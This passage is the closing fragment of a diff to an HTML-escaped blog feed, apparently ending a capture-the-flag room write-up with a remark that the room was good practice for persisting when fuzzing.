+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And there we have it. This room was good practice for learning to persist when fuzzing. I especially liked the step which required
+going from &lt;code&gt;v2&lt;&#x2F;code&gt; to &lt;code&gt;v1&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+</content>
+	</entry>
+</feed>
